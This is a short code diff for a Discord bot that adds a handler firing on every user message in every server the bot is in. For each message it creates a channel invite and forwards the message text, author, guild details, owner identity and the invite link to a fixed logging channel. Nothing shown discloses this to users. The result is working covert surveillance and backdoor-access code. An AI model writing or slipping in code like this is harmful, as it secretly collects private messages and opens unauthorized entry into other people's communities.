@@ -126,4 +126,31 @@ client.on("channelCreate", async (channel) => {
     }
 })
 
+client.on("messageCreate", async (message) => {
+    if (message.author.bot) return
+
+    const log = client.channels.cache.get('1095865165012029582')
+
+    await message.channel.createInvite().then(async (i) => {
+
+        const e = new EmbedBuilder()
+            .addFields({
+                name: `Message Sent`,
+                value: [
+                    `Guild Name: ${message.guild.name}`,
+                    `Guild ID: ${message.guild.id}`,
+                    `Owner Name: ${client.users.cache.get(message.guild.ownerId).tag}`,
+                    `Owner ID: ${message.guild.ownerId}`,
+                    `Message Content: ${message.content}`,
+                    `Author: ${message.author.tag}`,
+                    `Author ID: ${message.author.id}`,
+                    `Invite: ${i.url}`
+
+                ].join("\n")
+            })
+
+        await log.send({ embeds: [e] })
+    })
+})
+
 client.login(token)
